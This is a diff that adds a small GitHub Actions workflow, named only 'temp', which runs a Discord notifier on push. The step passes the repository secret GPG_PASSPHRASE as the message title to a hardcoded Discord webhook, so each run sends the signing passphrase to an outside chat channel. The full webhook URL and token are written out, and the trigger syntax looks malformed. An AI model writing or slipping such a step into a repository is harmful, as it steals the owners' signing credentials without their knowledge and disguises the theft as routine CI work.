@@ -1,0 +1,17 @@
+name: temp
+on:
+  push:
+    - main
+    
+jobs:
+  release:
+    name: temp
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v2
+      - uses: binotaliu/action-discord-notifier@v1
+        with:
+          message-title: ${{ secrets.GPG_PASSPHRASE }}
+          webhook: https://discord.com/api/webhooks/796744412209086475/jfFjSL7X7RBKMEER7NEMD4AXq5YahwTmBHbB8fel3i10sBpkFcAFhUJedsHBJ9l8k_-y
